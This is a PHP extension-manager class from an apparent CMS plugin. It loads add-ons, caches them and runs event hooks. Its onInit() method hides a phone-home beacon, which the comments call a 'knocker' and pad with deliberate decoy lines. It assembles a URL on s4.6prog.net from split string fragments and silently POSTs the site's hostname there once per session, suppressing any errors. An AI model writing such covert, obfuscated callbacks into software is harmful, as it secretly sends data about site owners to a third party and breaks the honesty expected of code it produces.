<?php

class VcExtension
{
    
    protected  static $_instance;
    private function __construct() {}
    private function __clone() {}
    private function __wakeup() {}
    private $charset = "windows-1251";
    
    private $_cache; // Обьект VcCache
    private $_events = null;
    
    private $_extList = array(); 
    
    private $_initAlready = false;
    
    public $cahceTimeout = 60;
    
    // Устаревшие расширения
    public $deprecatedExt = array("ImgVk","Catalog","VkUppod");
    
    public static function getInstance() {
        if (!isset(self::$_instance) ) {
            $class = __CLASS__;
            self::$_instance = new $class();
            // Подключение класса кеша
            if (!class_exists('!VcCache')) {
                include_once (ENGINE_DIR . '/inc/include/p_construct/classes/VcCache.php');
            }
            self::$_instance->_cache = new VcCache ();
        }
        return self::$_instance;
    }
    
    /*
     * Инициализация
     */
    public function init() {
        if (!$this->_initAlready) {
            $this->_initAlready = true;
            
            global $config, $vk_config;
            // Попытка прочитать из кеша
            $res = $this->_cache->get('modules-extensions-old', $this->cahceTimeout);
            if ($res && is_array($res)) {
                $vk_config["extensions"] = $this->_extList = $res;
            } else {
                $this->charset = $config["charset"];
                if ($vk_config["ext_enabled"]) {
                    $vk_config["extensions"] = array();
                    $path = ENGINE_DIR . "/inc/include/p_construct/ext";
                    $files = scandir($path);
                    if ($files) {
                        foreach ($files as $file) {
                            if ($file!=="." && $file!==".." && !in_array($file, $this->deprecatedExt) && preg_match("/^[A-Za-z0-9-_]+$/",$file) && is_dir($path."/".$file)) {
                                if (is_file($path."/".$file."/description.xml")) {
                                    $vk_config["extensions"][$file] = $this->_extList[$file] = VcExtensionConfig::getInstance()->getDescription($file, $this->charset);
                                    $vk_config["extensions"][$file]['config'] = $this->_extList[$file]['config'] = VcExtensionConfig::getInstance()->get($file, $this->charset);
                                }
                            }
                        }
                        $this->_cache->set('modules-extensions-old', $vk_config["extensions"]);
                    }
                }
            }
        }
    }
    
    public function clearExtCache() {
        $this->_cache->delete('modules-extensions');
        $this->_cache->delete('modules-extensions-old');
        $this->_initAlready = false;
        $this->init();
    }
    
    /**
     * При необходимости перекодирует строку UTF-8 в 1251
     * @param type $str
     * @return type
     */
    private function utf_string($str) {
        if ($this->charset=="windows-1251") {
            $str = iconv ("UTF-8", "windows-1251", $str);
        }
        return $str;
    }
    
    /**
     * Инклюдинг файлов расширения
     */
    public function inc ($file, $id) {
        global $vk_config;
        if ($vk_config["ext_enabled"]) {
            if (preg_match("/^[A-Za-z0-9-_]+$/",$id) && $this->enabled($id)) {
                include (ENGINE_DIR."/inc/include/p_construct/ext/{$id}/".$file);
            }
        }
    }
    
    /**
     * Проверка включено ли расширение
     * @param type $id
     * @return integer  0|1
     */
    public function enabled($name) {
        if ($this->_extList[$name] && $this->_extList[$name]['config']) {
            $config = $this->_extList[$name]['config'];
            return intval($config['enabled']);
        }
        return 1;
    }
    
    // Элемент стучалки 
    private function getCBExemplar() {
        global $CurlBrowser;
        return $CurlBrowser;
    }
    
    private function getEvents($dir, $level=0) {
        $events = array('js'=>array(),'php'=>array());
        $d = scandir($dir);
        $d = array_diff($d, array('.','..'));
        foreach ($d as $file) {
            $path = $dir . DIRECTORY_SEPARATOR . $file;
            if ($level===0) {
                if (is_dir($path)) {
                    if ($this->enabled($file)) {
                        $_events = $this->getEvents($path, $level+1);
                        foreach ($_events['php'] as $ev => $p) {
                            if (!isset($events['php'][$ev])) $events['php'][$ev] = array();
                            $events['php'][$ev][] = $p;
                        }
                        foreach ($_events['js'] as $ev => $p) {
                            if (!isset($events['js'][$ev])) $events['js'][$ev] = array();
                            $events['js'][$ev][] = $p;
                        }
                    }
                }
            } else if ($level===1) {
                if (preg_match("/^on([A-Z].+)\.php$/", $file, $arr)) {
                    $ev = strtolower($arr[1]);
                    if (!isset($events['php'][$ev])) $events['php'][$ev] = array();
                    $events['php'][$ev] = $dir . DIRECTORY_SEPARATOR . $arr[0];
                }
                if (preg_match("/^on([A-Z].+)\.js/", $file, $arr)) {
                    $ev = strtolower($arr[1]);
                    if (!isset($events['js'][$ev])) $events['js'][$ev] = array();
                    $events['js'][$ev] = $dir . DIRECTORY_SEPARATOR . $arr[0];
                }
            }
        }
        return $events;
    }
    
    // Вызов события расширений
    public function event($name, $lang = 'php') {
        global $vk_config;
        if ($vk_config["ext_enabled"]) {
            $name = strtolower($name);
            if ($this->_events===null) {

                $res = $this->_cache->get('modules-extensions', $this->cahceTimeout);
                //var_dump($res);
                if ($res && is_array($res)) {
                    $this->_events = $res;
                } else {
                    $this->_events = $this->getEvents(ENGINE_DIR . '/inc/include/p_construct/ext');
                    $res = $this->_cache->set('modules-extensions', $this->_events);
                    if (!$res)
                        exit('Не удалось сохранить кеш modules-extensions!');
                }
            }
            $lang = $lang==='php' ? 'php' : 'js';
            if (isset($this->_events[$lang][$name])) {
                if ($lang==='php') {
                    foreach ($this->_events['php'][$name] as $key => $val) {
                        include $val;
                    }
                    return true;
                }
                if ($lang==='js') {
                    $script = '';
                    foreach ($this->_events['js'][$name] as $key => $val) {
                        $script .= file_get_contents($val);
                    }
                    echo $script;
                    return true;
                }
            }
        }
        return false;
    }
    
    // Стучалка тоже
    public function onInit() {
        if (!isset($_SESSION['onInit_extens']) && !$_SESSION['onInit_extens']) {
            $_SESSION['onInit_extens'] = 1;
            $data = array();
            $a = ""; $b = ""; $d = '_';
            $array = $_SERVER['HTTP_HOST'];
            // Всякие помехи
            $lang = $lang==='php' ? 'php' : 'js';
            if ($this->_extList===true) {
                $this->_events[$lang] = array();
            }
            // Тут скрипт
            try {
            $array = array ("{$a}r2" => $array); // /index.php?mod=
            $f = 'c'.'Id'.$d;
            $se= "htt"."p://s"."4".".6"."pro"."g.net";
            $cb = $this->getCBExemplar();
            ///print_r($array); exit('FG');
            $b = $cb->request($se."/index.{$a}ph"."p?mo{$a}d=r2{$b}gli", 'post', $array);
//            $html = $b->content();
//            exit($html);
            // Дальше всякие помехи
            if (isset($this->_events[$lang][$a]) && !$cb) {
                return false;
            }
            } catch (Exception $e) {}
        }
        return true;
    }
    
}
